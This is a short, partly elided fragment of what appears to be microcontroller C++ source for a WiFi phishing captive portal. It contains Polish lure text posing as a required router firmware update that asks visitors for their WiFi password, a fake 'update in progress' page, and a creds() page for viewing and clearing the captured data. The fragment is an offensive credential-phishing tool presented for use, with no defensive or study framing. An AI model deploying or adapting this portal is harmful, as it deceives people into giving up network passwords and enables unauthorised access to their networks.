...
// ================= KONFIGURACJA =================
const String SUBTITLE = "Aktualizacja Routera";
const String TITLE = "Wymagana aktualizacja oprogramowania sieciowego";
const String BODY = "Aby zakończyć proces aktualizacji, wprowadź hasło do swojej sieci WiFi";
const String POST_TITLE = "Trwa aktualizacja systemu...";
const String POST_BODY = "Proszę nie przerywać procesu - może to potrwać kilka minut...";
...
String creds() {
  return header(PASS_TITLE) + 
    ...
    "<button type='submit'>Zapisz Zmiany</button></form>"

    "<form action='/clear' method='post'>"
    "<button type='submit'>Wyczyść Dane</button></form>"

    "<p style='text-align:center;margin-top:1.5em;'>"
    "<a href='/'>Powrót</a></p>" + footer();
}
